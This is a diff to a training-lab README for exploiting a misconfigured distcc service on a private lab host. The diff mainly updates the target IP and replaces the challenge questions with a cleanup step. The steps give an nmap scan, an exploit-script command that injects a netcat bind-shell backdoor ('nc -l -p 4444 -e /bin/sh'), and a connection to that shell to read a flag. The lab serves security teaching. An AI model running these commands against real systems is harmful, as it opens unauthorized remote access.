@@ -6,14 +6,12 @@ Identify a vulnerable service, research its exploitation method, and successfull
 ### Bind vs Reverse Shell
 The machine initiating the connection will determine the type of **Shell** that is opened by a malicious cyber actor.  Regardless of direction, one of the machines must be **Listening** for a connection, which is typically initiated by the Attacker on either their machine or the victim's machine.
 
-**Bind Shell**: Attacker-Machine ----Connects----> Victim-Machine
-
-**Reverse Shell**: Victim-Machine ----Connects----> Attacker-Machine
+![](sysdig_shells.png)
 
 ## Scenario
 A legacy server on the network is reportedly running a distributed compiler service (`distcc`). This service, if misconfigured, can allow remote users to execute arbitrary commands. Your goal is to exploit this service to force the target to open a "backdoor" listener that you can connect to.
 
-The target is reachable at `172.20.0.20`.
+The target is reachable at `172.30.0.30`.
 
 ## Steps
 
@@ -21,7 +19,7 @@ The target is reachable at `172.20.0.20`.
 Scan the target to find the `distcc` service.
 
 ```bash
-nmap -Pn -sV -p3632 172.20.0.20
+nmap -Pn -sV -p3632 172.30.0.30
 ```
 
 Look for port **3632**. It should be running `distcc v1`.
@@ -39,7 +37,7 @@ We will use the Python script provided in this directory to send a malicious com
 Execute the following in your terminal:
 
 ```bash
-python3 exploit_distcc.py 172.20.0.20 "nohup nc -l -p 4444 -e /bin/sh >/dev/null 2>&1 &"
+python3 exploit_distcc.py 172.30.0.30 "nohup nc -l -p 4444 -e /bin/sh >/dev/null 2>&1 &"
 ```
 *Note: We use `nohup` and the `&` symbol to ensure the netcat listener continues to run in the background on the target even after our exploit script finishes its task.*
 
@@ -47,7 +45,7 @@ python3 exploit_distcc.py 172.20.0.20 "nohup nc -l -p 4444 -e /bin/sh >/dev/null
 Now that the target is listening, use `netcat` (`nc`) to connect to the "backdoor" you just opened:
 
 ```bash
-nc -vn 172.20.0.20 4444
+nc -vn 172.30.0.30 4444
 ```
 
 If successful, you will have a command prompt.
@@ -60,7 +58,5 @@ hostname
 cat /flag.txt
 ```
 
-## Challenge Questions
-1. What is the main difference between a "Bind Shell" and a "Reverse Shell"?
-2. Why might a Bind Shell fail if there is a firewall on the target machine?
-3. Which type of shell is generally harder for a network administrator to detect?
+## 6. Cleanup
+Run `./attacker_scenario_2/scenario.sh reset` to clean up and reset the scenario.
